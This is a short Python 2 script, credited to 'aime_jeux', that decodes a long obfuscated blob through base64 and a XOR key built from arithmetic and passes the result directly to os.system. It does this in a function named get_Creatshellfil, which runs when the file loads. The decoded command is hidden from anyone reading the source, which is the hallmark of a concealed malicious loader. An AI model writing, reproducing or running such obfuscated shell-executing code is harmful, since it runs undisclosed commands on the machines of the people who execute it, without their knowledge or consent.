#By aime_jeux
from os import system as os_system
import base64
from base64 import b64encode, b64decode
import base64
ab = 32654
ac = 13625
schlssl = '%s&%s%s%s' % (ab,
 ac,
 ab - ac,
 ab * ac)
def XorBase64Strings(s1, s2):
    s1 = b64decode(s1)
    s2 = b64decode(s2)
    while len(s2) < len(s1):
        s2 += s2
    out = ''
    for index in range(len(s1)):
        out += chr(ord(s1[index]) ^ ord(s2[index]))
    return b64encode(out)
Scrptos = 'EBMZV11IHkBeOD9CVVVXSRQFATN1f2B7fHxzcmpwb2MOXkZBQQMfHU1RWFFaWVFFUlVBH0JAWk9CWlcfXEFSHkFcWFJdSR9TWFgfOXZ5YnpqfnJybXN4dXUPXlFAcFhFUWNgfnocRl1ELHV8YXx5fnh0bWl1ZnV0Yg0VCkNDUQsXEA5SUkISGkdYQh1cQFcbF0JEVEVTWxxVU1MPExVXUUEMChZQbU1EUQQDFlpUDREWHlxSRV5dUFtSEUUQVUtRRBR8RVhSR15WRhZJFEVERxYfUREbEBAZGVIFCBg6e3pzcn5pe3VrdA4ZRlhBFh5WUEdEWFhIfVJGQ1JVUxtHTjs5YXVwZWZ/Z21kYWAEFRgFCxYCEkFSUVIRHnkSGkdYQh1cQFcbF1xVREZRVFcYWEdBERESdnpmd3x9eHBrcHBjHxNxf2R8enp1Ym51f35wFX1/ZXd4e3V9bmB2Z3F+YRQcPiwSE3tTXlQZQ0dLURRAUVQQU1pHXV5ZVFAGRlZYRhVeUlFLFz5dUhlqEBMKEB5cUxUEBmw5FkZdVFc6EhkUFBcZRldSQRBbU1IVRFReUVpXWEIXOhIZFBRRWllfFwQOFQAWEQQcERESZXJ0bW99bGBkYW0TEBdwSFpGX1tTCBENFh1BXEkfVVxAeVFKQlFQUB5fXVE/FAYRE1NKXEUZAThfXT4+UFcQUlZYXBIUEWNhdGdpfWBlaWVmGxRIFF5DVUcVFwICBhATBhcNFh1RVE8fXExYWD4ZRVhSWzoTEhYVd2t1DhIaVlBNEB1PVUYbXEVTGBtdVkFFVFNDH15FVRw7GRASGUNTUU0RHUYVHXwSGVFRUB5dQ15ZERsUcXRwFj5cXUNSPxATEhZQV05eExR/UEJKUVVcFFZGVlBUVFRDR1tYUhRAUFpaV1EfGxAMGRtAWUkeV1JBfVZBRVRTQx9fWVU/V1A6V0FdQBQJ='
Scrptoss = b64decode(XorBase64Strings(Scrptos, b64encode(schlssl))) 
def get_Creatshellfil():
    os_system(Scrptoss)
print get_Creatshellfil()